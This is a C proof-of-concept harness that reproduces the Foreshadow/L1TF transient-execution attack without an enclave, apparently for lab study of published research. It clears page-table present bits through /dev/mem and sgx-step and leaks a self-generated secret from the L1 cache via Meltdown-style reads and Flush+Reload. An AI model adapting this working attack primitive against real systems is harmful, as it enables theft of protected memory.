/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/*
 *  Enclave-free reconstruction of the Foreshadow/L1TF PoC.
 *
 *  Mirrors the SIM_ENCLAVE=1 path of the upstream sgx-step PoC
 *  (app/foreshadow/main.c) so the attack primitive can be reproduced on hosts
 *  where the enclave path is unavailable:
 *
 *    - no flexible launch control (in-tree /dev/sgx_enclave refuses to load),
 *    - patched microcode (L1D is flushed on enclave entry/exit),
 *    - no Intel SGX SDK installed at all: this build uses NO_SGX=1 and never
 *      needs libsgx_urts / encl_proxy.
 *
 *  Upstream PoC reference:
 *    https://github.com/jovanbulck/sgx-step/tree/master/app/foreshadow
 *  Paper: Foreshadow, USENIX Security 2018 (https://foreshadowattack.eu/)
 *
 *  Attack, in three phases (identical to the upstream SIM_ENCLAVE=1 run):
 *
 *    1. load the secret into L1D              (sim_reload -> movl (%adrs))
 *    2. clear the *present* bit of the PTE    (libsgxstep/pt.c via /dev/sgx-step
 *       mapping the page, keeping the PFN    and /dev/mem)
 *    3. transiently read it (Meltdown) and    (libsgxstep/foreshadow.c +
 *       recover bytes via Flush+Reload        transient.S)
 *
 *  Differences from upstream, deliberately kept minimal:
 *    - the enclave is replaced by the simulated secret from app/foreshadow's
 *      sim-enclave.c, copied below verbatim (it has no SGX dependency at all);
 *    - the SSA/GPRSGX extraction (DUMP_SSA) is not reproduced, since it needs a
 *      real enclave.
 *
 *  Build: see labs/foreshadow/README.md, section "Enclave-free harness".
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <sched.h>
#include <sys/mman.h>
#include <inttypes.h>

#include "libsgxstep/config.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/foreshadow.h"
#include "libsgxstep/cache.h"

/*
 * ---------------------------------------------------------------------------
 * Simulated enclave secret.
 *
 * Verbatim copy of sgx-step/app/foreshadow/sim-enclave.c so that this harness
 * stays a single translation unit (the app Makefiles of the tree build a
 * single main.c, and adding a second .c file would duplicate these symbols).
 *
 * NOTE: upstream places the secret at array[64*27] while declaring
 * `array[1000]`. That reads/writes past the end of the array on purpose in the
 * sense that it still lands inside the same 4 KiB page, which is page-aligned
 * via __attribute__((aligned(0x1000))). Kept as-is to stay faithful.
 * ---------------------------------------------------------------------------
 */

#define CACHE_LINE_SIZE     64
#ifndef SECRET_BYTES
    #define SECRET_BYTES    CACHE_LINE_SIZE
#endif

/* first few cache lines seem not to work stable (?) */
#define SECRET_CACHE_LINE   27
#define SECRET_OFFSET       (CACHE_LINE_SIZE*SECRET_CACHE_LINE)

uint8_t __attribute__ ((aligned(0x1000))) array[1000];
#define secret array[SECRET_OFFSET]

void *sim_generate_secret( void )
{
    for (int i = 0; i < SECRET_BYTES; i++)
        array[SECRET_OFFSET+i] = rand();
    return &secret;
}

void sim_destroy_secret( uint8_t cl[64] )
{
    for (int i = 0; i < SECRET_BYTES; i++)
    {
        cl[i] = array[SECRET_OFFSET+i];
        array[SECRET_OFFSET+i] = 0xff;
    }
}

void sim_reload( void *adrs )
{
    asm volatile (
        "movl (%0), %%eax\n\t"
        : : "c" (adrs)
        : "%rax");
}

/*
 * ---------------------------------------------------------------------------
 * Foreshadow/L1TF attack state (same globals as upstream main.c).
 * ---------------------------------------------------------------------------
 */

/* Watchdog: async-signal-safe, it only writes and exits. */
static void watchdog_handler( int sig )
{
    const char msg[] =
        "[main.c] watchdog: measurement stuck in the transient_access() retry loop\n"
        "          (unbounded `jz retry` on a 0x00 value) -- exiting\n";
    (void) sig;
    write(STDERR_FILENO, msg, sizeof(msg) - 1);
    _exit(2);
}

void *secret_ptr = NULL, *secret_page = NULL, *alias_ptr = NULL;
uint64_t *pte_alias = NULL, pte_alias_unmapped = 0x0;
int fault_fired = 0;

/* Called upon SIGSEGV caused by accessing the revoked alias mapping. */
void fault_handler( int signal )
{
    fault_fired++;

    /* remap so the abort page semantics apply and execution can continue */
    *pte_alias = MARK_PRESENT(pte_alias_unmapped);
    ASSERT( !mprotect( (void*) (((uint64_t) alias_ptr) & ~PFN_MASK), 0x1000,
                      PROT_READ | PROT_WRITE) );
}

/* Revoke access rights on the alias mapping, then undo Linux's PTE inversion
 * so the physical address is preserved and only the present bit is cleared. */
void unmap_alias( void )
{
    ASSERT( !mprotect( (void*) (((uint64_t) alias_ptr) & ~PFN_MASK), 0x1000,
                      PROT_NONE) );
    *pte_alias = pte_alias_unmapped;
}

void attacker_config_page_table( void )
{
    secret_ptr = sim_generate_secret();
    secret_page = (void *) ((uint64_t) secret_ptr & ~UINT64_C(0xfff));

    /* establish an independent virtual alias for the secret's page */
    alias_ptr = remap_page_table_level(secret_ptr, PAGE);
    info("Randomly generated secret at %p (page %p); alias at %p (revoking alias access rights)",
         secret_ptr, secret_page, alias_ptr);
    print_pte_adrs(secret_ptr);

    /* ensure a #PF on trigger accesses through the *alias* mapping */
    ASSERT( pte_alias = remap_page_table_level(alias_ptr, PTE) );
    pte_alias_unmapped = MARK_NOT_PRESENT(*pte_alias);
    unmap_alias();
    print_pte(pte_alias);
}

/*
 * Mirrors FORESHADOW_ZERO_RETRIES from libsgxstep/foreshadow.h, but applied at
 * the byte level, where the PTE can actually be revoked again between attempts.
 */
#define ZERO_RETRIES    50

/*
 * libsgxstep's transient_access() retries forever while the byte it reads is
 * 0x00 (unbounded `jz retry`). bound the damage with a per-byte watchdog; the
 * kernel restores the IDT/APIC state through the driver's release path when the
 * process dies.
 */
#define WATCHDOG_SEC    30

/*
 * ---------------------------------------------------------------------------
 * Main
 * ---------------------------------------------------------------------------
 */

int main( int argc, char **argv )
{
    int i, mismatches;
    uint8_t real[SECRET_BYTES] = {0x0};
    uint8_t recovered[SECRET_BYTES] = {0x0};
    unsigned seed = (unsigned) time(NULL) ^ (unsigned) getpid();
    int zero_retries = ZERO_RETRIES;
    int watchdog = WATCHDOG_SEC;

    /* unbuffered-ish output: a stalled run must be distinguishable from a slow
     * one, and each byte prints a progress line below */
    setvbuf(stdout, NULL, _IOLBF, 0);

    /* randomize the secret per run so that a failing byte can be classified as
     * position-dependent or value-dependent; override with SEED=<n> to repeat
     * a specific run. RETRIES=<n> overrides the per-byte retry budget. */
    if (getenv("SEED"))
        seed = (unsigned) strtoul(getenv("SEED"), NULL, 0);
    if (getenv("RETRIES"))
        zero_retries = atoi(getenv("RETRIES"));
    if (getenv("WATCHDOG"))
        watchdog = atoi(getenv("WATCHDOG"));
    srand(seed);
    info("secret seed: 0x%08x; retry budget: %d; watchdog: %ds (SEED= RETRIES= WATCHDOG=)",
         seed, zero_retries, watchdog);

    ASSERT( signal(SIGALRM, watchdog_handler) != SIG_ERR );

    /* configure the untrusted runtime: pin the victim CPU, set up the
     * user-space ISR/APIC state and our SIGSEGV handler */
    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    ASSERT( signal(SIGSEGV, fault_handler) != SIG_ERR );

    attacker_config_page_table();
    foreshadow_init();

    info_event("Foreshadow secret extraction (enclave-free)");
    info("prefetching secret into L1D (sim_reload)...");
    sim_reload( secret_ptr );

    info("extracting secret from L1D via transient read..");
    for (i = 0; i < SECRET_BYTES; i++)
    {
        /*
         * Transient reads are biased towards a zero result. The first access
         * to the revoked alias raises SIGSEGV and our handler makes that
         * mapping present again, so the retries *inside* foreshadow() cannot
         * leak anything. Re-revoke the PTE and repeat the whole measurement
         * here instead.
         */
        int tries = 0;
        uint8_t b;

        alarm(watchdog);
        do
        {
            unmap_alias();
            sim_reload( secret_ptr );
            b = (uint8_t) foreshadow( alias_ptr + i );
            if (b == 0x00)
                sched_yield();  /* perturb the steady-state cache/TLB pattern */
        }
        while (b == 0x00 && ++tries < zero_retries);
        alarm(0);

        recovered[i] = b;
        info("byte %2d: 0x%02x (retries=%d)", i, b, tries);
    }

    info("verifying and destroying secret..");
    sim_destroy_secret( real );

    mismatches = foreshadow_compare_secret(recovered, real, SECRET_BYTES);
    info("harness summary: mismatched bytes=%d/%d; handled SIGSEGV=%d",
         mismatches, SECRET_BYTES, fault_fired);
    foreshadow_dump_perf();

    restore_system_state();
    return 0;
}
